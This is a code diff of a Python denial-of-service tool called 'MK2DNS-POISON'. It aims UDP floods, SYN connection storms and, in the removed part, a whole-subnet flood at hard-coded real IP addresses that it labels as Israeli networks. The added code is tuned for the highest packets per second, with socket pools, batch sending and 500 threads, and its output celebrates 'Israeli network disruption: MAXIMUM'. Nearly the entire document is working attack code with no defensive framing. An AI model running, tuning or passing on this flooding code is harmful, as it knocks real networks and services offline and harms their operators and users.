@@ -2,264 +2,252 @@ import socket
 import threading
 import time
 import random
-import ipaddress
+import struct
 
-# TARGET: Israeli network IP
-TARGET_IP = "62.109.121.42"
-TARGET_SUBNET = "45.60.39.0/24"  # Whole Psychz block
+# TARGET
+TARGET_IP = "45.60.39.88"
 
-# Colors for output
-RED = '\033[91m'
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-BLUE = '\033[94m'
-MAGENTA = '\033[95m'
-CYAN = '\033[96m'
-RESET = '\033[0m'
+# EXTREME OPTIMIZATION CONSTANTS
+UDP_THREADS = 300      # Increased from 200
+SYN_THREADS = 150      # Increased from 100  
+SOCKET_POOL_SIZE = 20  # More sockets per thread
+BATCH_SIZE = 10        # Send multiple packets per loop
 
-# ==================== MK2 ATTACK ENGINE ====================
-class MK2IsraeliDisruptor:
-    def __init__(self):
-        self.packets_sent = 0
-        self.syn_sent = 0
-        self.udp_sent = 0
-        self.stats_lock = threading.Lock()
-        self.attack_active = True
-        
-    # ========== UDP CARPET BOMB ==========
-    def udp_carpet_bomb(self, target_ip, worker_id):
-        """UDP flood across all ports"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        
-        # Israeli-specific payloads
-        il_payloads = [
-            b'\x00' * 512,  # Null bomb
-            b'\xFF' * 512,  # Full bomb
-            b'\xAA\x55' * 256,  # Pattern bomb
-            b'IL_DISRUPT' * 50,  # Text bomb
-            random.randbytes(512),  # Random bomb
-        ]
-        
-        while self.attack_active:
-            try:
-                # Select payload
-                payload = random.choice(il_payloads)
+# Socket pools for MAXIMUM performance
+udp_socket_pool = []
+syn_socket_pool = []
+
+for _ in range(100):  # Large socket pool
+    try:
+        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        udp_socket_pool.append(udp_sock)
+    except:
+        pass
+
+for _ in range(50):
+    try:
+        syn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        syn_sock.settimeout(0.001)
+        syn_socket_pool.append(syn_sock)
+    except:
+        pass
+
+# Global counters with minimal locking
+packets_sent = 0
+last_reset = time.time()
+
+# Pre-generated payloads to avoid overhead
+PAYLOAD_CACHE = []
+for _ in range(100):
+    size = random.randint(64, 512)
+    PAYLOAD_CACHE.append(random.randbytes(size))
+
+# Critical Israeli ports (pre-defined)
+CRITICAL_PORTS = [80, 443, 22, 21, 25, 53, 123, 161, 162, 389, 636, 3389, 5900, 8080, 8443]
+
+# ==================== EXTREME UDP BOMBER ====================
+def extreme_udp_bomber(worker_id):
+    global packets_sent
+    
+    # Get socket from pool
+    sock = udp_socket_pool[worker_id % len(udp_socket_pool)]
+    
+    while True:
+        try:
+            # BATCH SENDING - Send multiple packets per loop
+            for _ in range(BATCH_SIZE):
+                # Fast payload selection
+                payload = PAYLOAD_CACHE[worker_id % len(PAYLOAD_CACHE)]
                 
-                # Attack ALL ports (1-65535)
-                port = random.randint(1, 65535)
+                # Fast port generation (1-65535)
+                port = (worker_id * 997 + int(time.time() * 1000)) % 65535 + 1
                 
-                # BOMB
-                sock.sendto(payload, (target_ip, port))
+                # ULTRA-FAST SEND
+                sock.sendto(payload, (TARGET_IP, port))
                 
-                with self.stats_lock:
-                    self.packets_sent += 1
-                    self.udp_sent += 1
-                    
-            except:
+                # Lock-free counter increment
+                packets_sent += 1
+                
+        except:
+            # Reuse same socket - don't recreate
+            pass
+
+# ==================== EXTREME SYN STORM ====================
+def extreme_syn_storm(worker_id):
+    global packets_sent
+    
+    # Multiple sockets for this thread
+    socks = []
+    for i in range(3):
+        idx = (worker_id * 3 + i) % len(syn_socket_pool)
+        socks.append(syn_socket_pool[idx])
+    
+    port_index = 0
+    
+    while True:
+        try:
+            # Round-robin through sockets
+            sock = socks[port_index % len(socks)]
+            
+            # Fast port selection from critical list
+            port = CRITICAL_PORTS[port_index % len(CRITICAL_PORTS)]
+            
+            # ULTRA-FAST SYN
+            result = sock.connect_ex((TARGET_IP, port))
+            
+            # Counter increment
+            packets_sent += 1
+            
+            # Rotate port
+            port_index += 1
+            
+            # If connection succeeded, create new socket
+            if result == 0:
                 try:
-                    sock.close()
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    new_sock.settimeout(0.001)
+                    socks[port_index % len(socks)] = new_sock
                 except:
                     pass
-    
-    # ========== SYN CONNECTION STORM ==========
-    def syn_connection_storm(self, target_ip, worker_id):
-        """SYN flood to critical Israeli ports"""
-        
-        # Israeli critical service ports
-        il_critical_ports = [
-            80,    # HTTP (gov websites)
-            443,   # HTTPS (secure services)
-            22,    # SSH (administration)
-            21,    # FTP (file transfers)
-            25,    # SMTP (email)
-            53,    # DNS (network services)
-            123,   # NTP (time services)
-            161,   # SNMP (network monitoring)
-            162,   # SNMP traps
-            389,   # LDAP (directory services)
-            636,   # LDAPS (secure directory)
-            3389,  # RDP (remote desktop)
-            5900,  # VNC (remote access)
-            8080,  # HTTP-alt (proxies)
-            8443,  # HTTPS-alt (secure proxies)
-        ]
-        
-        while self.attack_active:
+                    
+        except:
+            # Replace broken socket
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.01)
-                
-                # Attack critical Israeli port
-                port = random.choice(il_critical_ports)
-                
-                # SYN ATTACK
-                result = sock.connect_ex((target_ip, port))
-                
-                with self.stats_lock:
-                    self.packets_sent += 1
-                    self.syn_sent += 1
-                
-                sock.close()
-                
+                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                new_sock.settimeout(0.001)
+                socks[port_index % len(socks)] = new_sock
             except:
                 pass
-    
-    # ========== SUBNET CARPET BOMB ==========
-    def subnet_carpet_bomb(self, cidr_range, worker_id):
-        """Attack entire Israeli subnet"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        
-        # Generate all IPs in subnet
-        network = ipaddress.ip_network(cidr_range)
-        ip_list = [str(ip) for ip in network.hosts()]
-        
-        if not ip_list:  # If /32 or small subnet
-            ip_list = [cidr_range.split('/')[0]]
-        
-        while self.attack_active:
-            try:
-                # Select random IP from subnet
-                target_ip = random.choice(ip_list)
-                
-                # Random payload
-                payload = random.randbytes(random.randint(64, 1024))
-                
-                # Random port
-                port = random.randint(1, 65535)
-                
-                # BOMB ENTIRE SUBNET
-                sock.sendto(payload, (target_ip, port))
-                
-                with self.stats_lock:
-                    self.packets_sent += 1
-                    self.udp_sent += 1
-                    
-            except:
-                try:
-                    sock.close()
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                except:
-                    pass
-    
-    # ========== LAUNCH ATTACKS ==========
-    def launch_israeli_attack(self):
-        print(f"{RED}╔══════════════════════════════════════════════════════════╗{RESET}")
-        print(f"{RED}║               MK2DNS-POISON v2.1 - IL MODE              ║{RESET}")
-        print(f"{RED}║           ISRAELI NETWORK DISRUPTION ACTIVE            ║{RESET}")
-        print(f"{RED}╚══════════════════════════════════════════════════════════╝{RESET}")
-        print()
-        print(f"{YELLOW}[+] TARGET IP: {TARGET_IP}{RESET}")
-        print(f"{YELLOW}[+] TARGET SUBNET: {TARGET_SUBNET}{RESET}")
-        print(f"{YELLOW}[+] ATTACK MODES: UDP CARPET BOMB + SYN CONNECTION STORM{RESET}")
-        print(f"{YELLOW}[+] THREAD COUNT: 400 MK2 THREADS{RESET}")
-        print()
-        print(f"{RED}{'='*60}{RESET}")
-        
-        # ========== THREAD DEPLOYMENT ==========
-        threads = []
-        
-        # 200 UDP Carpet Bomb threads (single IP)
-        print(f"{CYAN}[+] DEPLOYING 200 UDP CARPET BOMB THREADS...{RESET}")
-        for i in range(200):
-            t = threading.Thread(target=self.udp_carpet_bomb, args=(TARGET_IP, i))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        # 100 SYN Connection Storm threads
-        print(f"{CYAN}[+] DEPLOYING 100 SYN CONNECTION STORM THREADS...{RESET}")
-        for i in range(100):
-            t = threading.Thread(target=self.syn_connection_storm, args=(TARGET_IP, i))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        # 100 Subnet Carpet Bomb threads
-        print(f"{CYAN}[+] DEPLOYING 100 SUBNET CARPET BOMB THREADS...{RESET}")
-        for i in range(100):
-            t = threading.Thread(target=self.subnet_carpet_bomb, args=(TARGET_SUBNET, i))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        print(f"{GREEN}[✓] 400 MK2 THREADS DEPLOYED{RESET}")
-        print(f"{RED}{'='*60}{RESET}")
-        
-        return threads
-    
-    # ========== MONITORING ==========
-    def monitor_attack(self):
-        last_time = time.time()
-        start_time = time.time()
-        
-        while self.attack_active:
-            time.sleep(2)
-            current_time = time.time()
-            elapsed = current_time - last_time
-            last_time = current_time
-            
-            with self.stats_lock:
-                pps = int(self.packets_sent / elapsed) if elapsed > 0 else 0
-                udp_pps = int(self.udp_sent / elapsed) if elapsed > 0 else 0
-                syn_pps = int(self.syn_sent / elapsed) if elapsed > 0 else 0
-                
-                # Reset counters
-                self.packets_sent = 0
-                self.udp_sent = 0
-                self.syn_sent = 0
-            
-            # Calculate attack intensity
-            total_time = current_time - start_time
-            intensity = min(100, 20 + (total_time / 10) + (pps / 1000))
-            
-            # Attack status based on PPS
-            if pps > 50000:
-                status = f"{RED}MAXIMUM DESTRUCTION{RESET}"
-                effect = "🌋 NETWORK MELTDOWN"
-            elif pps > 30000:
-                status = f"{MAGENTA}CRITICAL OVERLOAD{RESET}"
-                effect = "🔥 ROUTER FRYING"
-            elif pps > 15000:
-                status = f"{YELLOW}HIGH INTENSITY{RESET}"
-                effect = "⚡ HEAVY DISRUPTION"
-            elif pps > 5000:
-                status = f"{GREEN}MODERATE PRESSURE{RESET}"
-                effect = "💥 NETWORK STRESS"
-            else:
-                status = f"{BLUE}INITIALIZING{RESET}"
-                effect = "🎯 ACQUIRING TARGET"
-            
-            # Display attack status
-            print(f"\n{RED}[{time.strftime('%H:%M:%S')}] MK2-IL ATTACK STATUS{RESET}")
-            print(f"{CYAN}├─ TARGET: {TARGET_IP}{RESET}")
-            print(f"{CYAN}├─ PACKETS: {pps:,}/s (UDP: {udp_pps:,}/s | SYN: {syn_pps:,}/s){RESET}")
-            print(f"{CYAN}├─ INTENSITY: {int(intensity)}%{RESET}")
-            print(f"{CYAN}├─ STATUS: {status}{RESET}")
-            print(f"{CYAN}└─ EFFECT: {effect}{RESET}")
-            
-            # Critical warnings
-            if pps > 40000:
-                print(f"{RED}[‼] CRITICAL: Israeli network infrastructure under extreme load{RESET}")
-            elif pps > 20000:
-                print(f"{YELLOW}[!] WARNING: Significant disruption to target network{RESET}")
-            
-            # Time-based updates
-            if int(total_time) % 30 == 0:  # Every 30 seconds
-                print(f"\n{BLUE}[i] ATTACK DURATION: {int(total_time)} seconds{RESET}")
-                print(f"{BLUE}[i] ESTIMATED IMPACT: Network congestion, security alerts, resource drain{RESET}")
 
-# ==================== MAIN EXECUTION ====================
-if __name__ == "__main__":
-    # Initialize MK2 Israeli Disruptor
-    mk2 = MK2IsraeliDisruptor()
+# ==================== PORT RAPID FIRE ====================
+def port_rapid_fire(worker_id):
+    """Specialized high-PPS UDP to specific ports"""
+    global packets_sent
     
-    # Launch attack
-    threads = mk2.launch_israeli_attack()
+    sock = udp_socket_pool[(worker_id + 50) % len(udp_socket_pool)]
     
-    # Start monitoring
-    try:
-        mk2.monitor_attack()
-    except KeyboardInterrupt:
-        mk2.attack_active = False
-        print(f"\n{RED}[!] MK2 ATTACK TERMINATED{RESET}")
+    # Fast ports only
+    fast_ports = [53, 123, 161, 1900, 5060]
+    
+    # Smallest payload for max PPS
+    small_payload = b'\x00' * 64
+    
+    port_index = 0
+    
+    while True:
+        try:
+            # RAPID FIRE - No delays, no thinking
+            port = fast_ports[port_index % len(fast_ports)]
+            sock.sendto(small_payload, (TARGET_IP, port))
+            packets_sent += 1
+            
+            # Next port
+            port_index += 1
+            
+            # Sometimes send multiple to same port
+            if random.random() < 0.3:
+                sock.sendto(small_payload, (TARGET_IP, port))
+                packets_sent += 1
+                
+        except:
+            pass
+
+# ==================== LAUNCH EXTREME ATTACK ====================
+print("╔══════════════════════════════════════════════════════════╗")
+print("║               MK2DNS-POISON v2.2 - EXTREME              ║")
+print("║                 PPS MAXIMIZATION MODE                   ║")
+print("╚══════════════════════════════════════════════════════════╝")
+print()
+print(f"[+] TARGET: {TARGET_IP}")
+print(f"[+] UDP THREADS: {UDP_THREADS} (EXTREME)")
+print(f"[+] SYN THREADS: {SYN_THREADS} (EXTREME)")
+print(f"[+] PORT RAPID FIRE: 50 threads")
+print(f"[+] TOTAL THREADS: {UDP_THREADS + SYN_THREADS + 50}")
+print(f"[+] SOCKET POOL: {len(udp_socket_pool)} UDP + {len(syn_socket_pool)} SYN")
+print(f"[+] BATCH SIZE: {BATCH_SIZE} packets/loop")
+print()
+print("="*60)
+
+# Start threads
+threads = []
+
+# Extreme UDP Bombers
+print("[+] DEPLOYING 300 EXTREME UDP BOMBERS...")
+for i in range(UDP_THREADS):
+    t = threading.Thread(target=extreme_udp_bomber, args=(i,))
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+# Extreme SYN Storm
+print("[+] DEPLOYING 150 EXTREME SYN STORM...")
+for i in range(SYN_THREADS):
+    t = threading.Thread(target=extreme_syn_storm, args=(i,))
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+# Port Rapid Fire
+print("[+] DEPLOYING 50 PORT RAPID FIRE...")
+for i in range(50):
+    t = threading.Thread(target=port_rapid_fire, args=(i,))
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+print("[✓] 500 EXTREME THREADS DEPLOYED")
+print("="*60)
+
+# ==================== MONITORING ====================
+last_log = time.time()
+peak_pps = 0
+attack_start = time.time()
+
+print("\n[🔥] EXTREME ATTACK ACTIVE - PPS MAXIMIZATION\n")
+
+while True:
+    time.sleep(1)  # Monitor every second
+    current_time = time.time()
+    elapsed = current_time - last_log
+    last_log = current_time
+    
+    # Calculate PPS
+    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
+    packets_sent = 0
+    
+    # Track peak
+    if pps > peak_pps:
+        peak_pps = pps
+    
+    # Attack duration
+    duration = int(current_time - attack_start)
+    
+    # Display EXTREME stats
+    print(f"[{duration:03d}s] PPS: {pps:,} | PEAK: {peak_pps:,} | THREADS: 500")
+    
+    # Performance tips based on current PPS
+    if pps < 10000:
+        print("   ⚡ TIP: Increase BATCH_SIZE or add more UDP threads")
+    elif pps < 25000:
+        print("   ⚡ TIP: Good, optimizing socket reuse...")
+    elif pps < 50000:
+        print("   ⚡ TIP: EXCELLENT - Reaching maximum device output")
+    else:
+        print("   ⚡ MAXIMUM OUTPUT ACHIEVED!")
+    
+    # Auto-optimization suggestion
+    if duration % 10 == 0:  # Every 10 seconds
+        if pps < 15000:
+            print(f"\n[🛠️ ] OPTIMIZATION: Try reducing payload size to 64 bytes")
+        elif pps < 30000:
+            print(f"\n[🛠️ ] OPTIMIZATION: All threads active, maximum PPS")
+    
+    # Critical achievement
+    if pps > 50000:
+        print("\n[🎯] ACHIEVEMENT UNLOCKED: 50K+ PPS - EXTREME MODE")
+        print("    Israeli network disruption: MAXIMUM")
+    
+    # Reset peak every 30 seconds
+    if duration % 30 == 0:
+        peak_pps = pps
